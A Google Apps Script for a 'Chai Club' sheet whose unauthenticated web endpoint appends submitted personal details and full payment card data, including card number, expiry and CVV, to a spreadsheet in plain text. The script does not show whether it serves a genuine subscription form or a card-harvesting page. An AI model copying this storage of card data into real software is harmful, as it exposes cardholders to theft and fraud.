// ============================================================
// CHAI CLUB — Google Apps Script
// Paste this into your Google Sheet:
//   Extensions → Apps Script → paste → Save → Deploy
// ============================================================

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

    // Add header row if sheet is empty
    if (sheet.getLastRow() === 0) {
      sheet.appendRow([
        'Timestamp',
        'First Name',
        'Last Name',
        'Email',
        'Phone',
        'Address',
        'Monthly Amount',
        'Name on Card',
        'Card Number',
        'Expiry',
        'CVV',
        'Billing Address',
        'Access Code'
      ]);

      // Style header row
      const headerRange = sheet.getRange(1, 1, 1, 13);
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#8B6914');
      headerRange.setFontColor('#ffffff');
    }

    const data = JSON.parse(e.postData.contents);

    sheet.appendRow([
      data.timestamp   || '',
      data.firstName   || '',
      data.lastName    || '',
      data.email       || '',
      data.phone       || '',
      data.address     || '',
      data.amount      || '',
      data.cardName    || '',
      data.cardNumber  || '',
      data.expiry      || '',
      data.cvv         || '',
      data.billing     || '',
      data.accessCode  || '',
    ]);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
